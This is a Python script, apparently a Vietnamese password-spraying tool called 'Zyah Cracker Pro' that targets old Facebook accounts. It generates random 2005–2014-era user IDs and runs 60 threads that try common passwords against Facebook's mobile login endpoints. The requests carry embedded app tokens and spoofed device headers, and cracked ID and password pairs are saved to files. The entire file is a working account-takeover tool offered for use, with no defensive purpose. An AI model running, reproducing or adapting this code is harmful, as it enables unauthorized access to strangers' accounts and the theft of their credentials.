
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# Tắt cảnh báo SSL
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# Cài đặt modules
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Biến toàn cục
method = []
oks = []
cps = []
loop = 0
user = []

# Màu sắc terminal
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
CYAN = '\x1b[38;5;51m'
BLUE = '\x1b[38;5;39m'
PURPLE = '\x1b[38;5;135m'
ORANGE = '\x1b[38;5;208m'

def animate_text(text, color=G, delay=0.02):
    """Hiệu ứng văn bản từng ký tự"""
    for char in text:
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)
    print(W)

def loading_animation(duration=2):
    """Hiệu ứng loading chuyên nghiệp"""
    frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    end_time = time.time() + duration
    while time.time() < end_time:
        for frame in frames:
            sys.stdout.write(f'\r{CYAN}[{frame}] {W}Đang tải hệ thống...{X}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write(f'\r{G}[✓] {W}Hoàn tất!{X}                \n')

def progress_bar(current, total, bar_length=30):
    """Thanh tiến trình"""
    percent = float(current) / total
    arrow = '█' * int(round(percent * bar_length))
    spaces = '░' * (bar_length - len(arrow))
    sys.stdout.write(f'\r{CYAN}[{arrow}{spaces}] {int(percent * 100)}% {W}({current}/{total}){X}')
    sys.stdout.flush()

def windows():
    """User-Agent Windows ngẫu nhiên"""
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    """User-Agent Windows nâng cao"""
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

sys.stdout.write('\x1b]2;ZYAH CRACKER PRO\x07')

def ____banner____():
    """Banner Zyah"""
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    print(f"""
{PURPLE}
▒███████▒▓██   ██▓ ▄▄▄       ██░ ██ 
▒ ▒ ▒ ▄▀░ ▒██  ██▒▒████▄    ▓██░ ██▒
░ ▒ ▄▀▒░   ▒██ ██░▒██  ▀█▄  ▒██▀▀██░
  ▄▀▒   ░  ░ ▐██▓░░██▄▄▄▄██ ░▓█ ░██ 
▒███████▒  ░ ██▒▓░ ▓█   ▓██▒░▓█▒░██▓
░▒▒ ▓░▒░▒   ██▒▒▒  ▒▒   ▓▒█░ ▒ ░░▒░▒
░░▒ ▒ ░ ▒ ▓██ ░▒░   ▒   ▒▒ ░ ▒ ░▒░ ░
 ░ ░ ░ ░ ▒ ▒ ░░    ░   ▒    ░  ░░ ░
  ░ ░     ░ ░           ░  ░ ░  ░  ░
░         ░ ░  
{W}
{CYAN}═══════════════════════════════════════════{W}
{G}     PHIÊN BẢN: 2.0 PRO | TỐC ĐỘ CAO{W}
{Y}     HỖ TRỢ: ĐÀO VIA 2005-2014{W}
{CYAN}═══════════════════════════════════════════{W}
""")

def creationyear(uid):
    """Ước tính năm tạo tài khoản Facebook"""
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010-2011'
        if uid.startswith(('100002', '100003')):
            return '2011-2012'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith(('10007', '10008')):
            return '2022'
        if uid.startswith('10009'):
            return '2023'
        return 'Không xác định'
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 6:
        return '2005'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return 'Không xác định'

def clear():
    os.system('clear')

def linex():
    print(f'{CYAN}═══════════════════════════════════════════{W}')

def BNG_71_():
    """Menu chính"""
    ____banner____()
    loading_animation(1.5)
    linex()
    print(f'   {PURPLE}[1] {W}CRACK VIA {Y}(2005-2014){W}')
    linex()
    print(f'   {PURPLE}[2] {W}XEM THỐNG KÊ THÀNH CÔNG{W}')
    linex()
    print(f'   {PURPLE}[0] {rad}THOÁT CHƯƠNG TRÌNH{W}')
    linex()
    __Jihad__ = input(f'   {CYAN}[?] {W}CHỌN TÙY CHỌN {Y}: {G}')
    if __Jihad__ in ('1', '01'):
        old_clone()
    elif __Jihad__ in ('2', '02'):
        show_stats()
    elif __Jihad__ in ('0', '00'):
        animate_text("Cảm ơn bạn đã sử dụng Zyah Cracker!", PURPLE)
        sys.exit()
    else:
        print(f"\n    {rad}[!] Vui lòng chọn tùy chọn hợp lệ!")
        time.sleep(2)
        BNG_71_()

def show_stats():
    """Hiển thị thống kê"""
    ____banner____()
    print(f"{CYAN}╔═══════════════════════════════════════════╗{W}")
    print(f"{CYAN}║{W}          THỐNG KÊ CRACK THÀNH CÔNG       {CYAN}║{W}")
    print(f"{CYAN}╚═══════════════════════════════════════════╝{W}")
    print(f"\n{G}[✓] Tổng tài khoản thành công: {Y}{len(oks)}{W}")
    print(f"{G}[✓] Tổng checkpoint: {Y}{len(cps)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

def old_clone():
    """Menu chọn loại crack"""
    ____banner____()
    print(f'   {PURPLE}[1] {W}CRACK TẤT CẢ CÁC SERIES {Y}(2005-2014){W}')
    linex()
    print(f'   {PURPLE}[2] {W}CRACK SERIES 100003/4 {Y}(2011-2012){W}')
    linex()
    print(f'   {PURPLE}[3] {W}CRACK SERIES 2009 {Y}(Tùy chỉnh){W}')
    linex()
    print(f'   {PURPLE}[0] {rad}QUAY LẠI{W}')
    linex()
    _input = input(f'   {CYAN}[?] {W}CHỌN TÙY CHỌN {Y}: {G}')
    if _input in ('1', '01'):
        old_One()
    elif _input in ('2', '02'):
        old_Tow()
    elif _input in ('3', '03'):
        old_Tree()
    elif _input in ('0', '00'):
        BNG_71_()
    else:
        print(f"\n{rad}[!] Vui lòng chọn tùy chọn hợp lệ!")
        time.sleep(2)
        old_clone()

def old_One():
    """Crack tất cả series 2005-2014"""
    user = []
    ____banner____()
    print(f"   {CYAN}[i] {W}CHẾ ĐỘ: {G}Crack toàn bộ tài khoản cũ 2005-2014{W}")
    linex()
    print(f"   {CYAN}[!] {Y}VÍ DỤ: {G}20000 / 50000 / 99999{W}")
    limit = input(f"   {CYAN}[?] {W}SỐ LƯỢNG ID CẦN CRACK {Y}: {G}")
    linex()
    
    # Tạo danh sách UID từ 2005-2014
    print(f"\n{CYAN}[~] {W}Đang tạo danh sách ID...{X}")
    
    # Series 2005-2008 (6-10 ký tự)
    for _ in range(int(int(limit) * 0.1)):  # 10% cho giai đoạn đầu
        uid_len = random.choice([6, 7, 8, 9, 10])
        uid = ''.join(random.choices('0123456789', k=uid_len))
        user.append(uid)
    
    # Series 2009-2010
    for _ in range(int(int(limit) * 0.2)):  # 20%
        prefix = random.choice(['100000', '1000001', '1000002', '1000003', '1000004', '1000005', '1000006', '1000007', '1000008', '1000009'])
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)
    
    # Series 2010-2014
    for _ in range(int(int(limit) * 0.7)):  # 70%
        prefix = random.choice(['100001', '100002', '100003', '100004', '100005', '100006', '100007', '100008'])
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)
    
    progress_bar(len(user), int(limit))
    print(f"\n{G}[✓] Đã tạo {len(user)} ID thành công!{W}")
    
    linex()
    print(f'   {PURPLE}[A] {W}PHƯƠNG THỨC 1 {Y}(Nhanh){W}')
    print(f'   {PURPLE}[B] {W}PHƯƠNG THỨC 2 {Y}(Chính xác cao){W}')
    print(f'   {PURPLE}[C] {W}PHƯƠNG THỨC KẾT HỢP {Y}(Khuyến nghị){W}')
    linex()
    meth = input(f"   {CYAN}[?] {W}CHỌN PHƯƠNG THỨC {Y}(A/B/C): {G}").strip().upper()
    
    with tred(max_workers=60) as pool:
        ____banner____()
        print(f"{CYAN}╔═══════════════════════════════════════════╗{W}")
        print(f"{CYAN}║{W}          BẮT ĐẦU CRACK TÀI KHOẢN         {CYAN}║{W}")
        print(f"{CYAN}╚═══════════════════════════════════════════╝{W}")
        print(f"\n{G}[+] Tổng ID: {Y}{len(user)}{W}")
        print(f"{G}[+] Phương thức: {Y}{meth}{W}")
        print(f"{G}[+] Workers: {Y}60 luồng{W}")
        print(f"{ORANGE}[!] Sử dụng chế độ máy bay để có kết quả tốt hơn{W}")
        linex()
        
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            elif meth == 'C':
                pool.submit(login_combined, uid)
            else:
                print(f"    {rad}[!] PHƯƠNG THỨC KHÔNG HỢP LỆ")
                break
    
    print(f"\n\n{G}╔═══════════════════════════════════════════╗{W}")
    print(f"{G}║{W}          HOÀN THÀNH CRACK                 {G}║{W}")
    print(f"{G}╚═══════════════════════════════════════════╝{W}")
    print(f"{G}[✓] Thành công: {Y}{len(oks)}{W}")
    print(f"{Y}[~] Checkpoint: {rad}{len(cps)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

def old_Tow():
    """Crack series 100003/4"""
    user = []
    ____banner____()
    print(f"   {CYAN}[i] {W}CHẾ ĐỘ: {G}Crack series 100003/100004{W}")
    linex()
    print(f"   {CYAN}[!] {Y}VÍ DỤ: {G}20000 / 50000 / 99999{W}")
    limit = input(f"   {CYAN}[?] {W}SỐ LƯỢNG ID CẦN CRACK {Y}: {G}")
    linex()
    
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    
    print(f'   {PURPLE}[A] {W}PHƯƠNG THỨC 1')
    print(f'   {PURPLE}[B] {W}PHƯƠNG THỨC 2')
    print(f'   {PURPLE}[C] {W}PHƯƠNG THỨC KẾT HỢP')
    linex()
    meth = input(f"   {CYAN}[?] {W}CHỌN PHƯƠNG THỨC {Y}(A/B/C): {G}").strip().upper()
    
    with tred(max_workers=60) as pool:
        ____banner____()
        print(f"{G}[+] Tổng ID: {Y}{limit}{W}")
        print(f"{G}[+] Series: {Y}100003/100004{W}")
        print(f"{ORANGE}[!] Sử dụng chế độ máy bay để có kết quả tốt hơn{W}")
        linex()
        
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            elif meth == 'C':
                pool.submit(login_combined, uid)
    
    print(f"\n{G}[✓] Hoàn thành! Thành công: {Y}{len(oks)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

def old_Tree():
    """Crack series 2009"""
    user = []
    ____banner____()
    print(f"   {CYAN}[i] {W}CHẾ ĐỘ: {G}Crack series 2009-2010{W}")
    linex()
    print(f"   {CYAN}[!] {Y}VÍ DỤ: {G}20000 / 50000 / 99999{W}")
    limit = input(f"   {CYAN}[?] {W}SỐ LƯỢNG ID CẦN CRACK {Y}: {G}")
    linex()
    
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    
    print(f'   {PURPLE}[A] {W}PHƯƠNG THỨC 1')
    print(f'   {PURPLE}[B] {W}PHƯƠNG THỨC 2')
    print(f'   {PURPLE}[C] {W}PHƯƠNG THỨC KẾT HỢP')
    linex()
    meth = input(f"   {CYAN}[?] {W}CHỌN PHƯƠNG THỨC {Y}(A/B/C): {G}").strip().upper()
    
    with tred(max_workers=60) as pool:
        ____banner____()
        print(f"{G}[+] Tổng ID: {Y}{limit}{W}")
        print(f"{G}[+] Series: {Y}1000004xxxx{W}")
        print(f"{ORANGE}[!] Sử dụng chế độ máy bay để có kết quả tốt hơn{W}")
        linex()
        
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            elif meth == 'C':
                pool.submit(login_combined, uid)
    
    print(f"\n{G}[✓] Hoàn thành! Thành công: {Y}{len(oks)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

def login_1(uid):
    """Phương thức đăng nhập 1 - Tối ưu tốc độ"""
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r{CYAN}[ZYAH-M1] {Y}({loop}) {G}OK({len(oks)}) {rad}CP({len(cps)}){W}")
        sys.stdout.flush()
        
        passwords = ['123456', '1234567', '12345678', '123456789', '1234567890', 
                     'password', '123123', '111111', '12341234', 'admin123', 'abc123', 'abcabc'
'111111', 'qwerty', 'iloveyou']
        
        for pw in passwords:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(rr(20000, 40000)),
                'X-FB-SIM-HNI': str(rr(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=10).json()
            if 'session_key' in res:
                print(f"\r{G}[ZYAH-OK] {W}ID: {G}{uid} {W}| PW: {G}{pw} {W}| NĂM: {Y}{creationyear(uid)}{W}")
                open('/sdcard/Zyah-OK-M1.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r{Y}[ZYAH-CP] {W}ID: {Y}{uid} {W}| PW: {Y}{pw} {W}| NĂM: {ORANGE}{creationyear(uid)}{W}")
                open('/sdcard/Zyah-CP-M1.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                cps.append(uid)
                break
        loop += 1
    except Exception:
        pass

def login_2(uid):
    """Phương thức đăng nhập 2 - Độ chính xác cao"""
    global loop
    sys.stdout.write(f"\r{CYAN}[ZYAH-M2] {Y}({loop}) {G}OK({len(oks)}) {rad}CP({len(cps)}){W}")
    sys.stdout.flush()
    
    passwords = ['123456', '123123', '1234567', '12345678', '123456789', '1234567890',
                 'password', '111111', '000000', '12341234', 'admin123', '102030']
    
    for pw in passwords:
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers, timeout=10).json()
                if 'session_key' in str(po) or 'session_key' in po:
                    print(f"\r{G}[ZYAH-OK] {W}ID: {G}{uid} {W}| PW: {G}{pw} {W}| NĂM: {Y}{creationyear(uid)}{W}")
                    open('/sdcard/Zyah-OK-M2.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in str(po):
                    print(f"\r{Y}[ZYAH-CP] {W}ID: {Y}{uid} {W}| PW: {Y}{pw} {W}| NĂM: {ORANGE}{creationyear(uid)}{W}")
                    open('/sdcard/Zyah-CP-M2.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                    cps.append(uid)
                    break
        except Exception:
            continue
    loop += 1

def login_combined(uid):
    """Phương thức kết hợp - Cân bằng tốc độ và độ chính xác"""
    global loop
    session = requests.session()
    
    sys.stdout.write(f"\r{PURPLE}[ZYAH-COMBO] {Y}({loop}) {G}OK({len(oks)}) {rad}CP({len(cps)}){W}")
    sys.stdout.flush()
    
    passwords = ['123456', '1234567', '12345678', '123456789', '1234567890',
                 'password', '123123', '111111', '000000', '12341234',
                 'admin123', '102030', 'qwerty', '123321', '654321']
    
    for pw in passwords:
        try:
            # Thử method 1
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'locale': 'en_US',
                'method': 'auth.login',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {'User-Agent': window1()}
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, timeout=8).json()
            
            if 'session_key' in res:
                print(f"\r{G}[ZYAH-OK] {W}ID: {G}{uid} {W}| PW: {G}{pw} {W}| NĂM: {Y}{creationyear(uid)}{W}")
                open('/sdcard/Zyah-OK-COMBO.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r{Y}[ZYAH-CP] {W}ID: {Y}{uid} {W}| PW: {Y}{pw} {W}| NĂM: {ORANGE}{creationyear(uid)}{W}")
                open('/sdcard/Zyah-CP-COMBO.txt', 'a').write(f"{uid}|{pw}|{creationyear(uid)}\n")
                cps.append(uid)
                break
        except Exception:
            continue
    loop += 1

if __name__ == '__main__':
    ____banner____()
    animate_text("╔═══════════════════════════════════════════╗", CYAN, 0.01)
    animate_text("║   CHÀO MỪNG ĐẾN VỚI ZYAH CRACKER PRO!    ║", PURPLE, 0.01)
    animate_text("╚═══════════════════════════════════════════╝", CYAN, 0.01)
    time.sleep(1)
    BNG_71_()
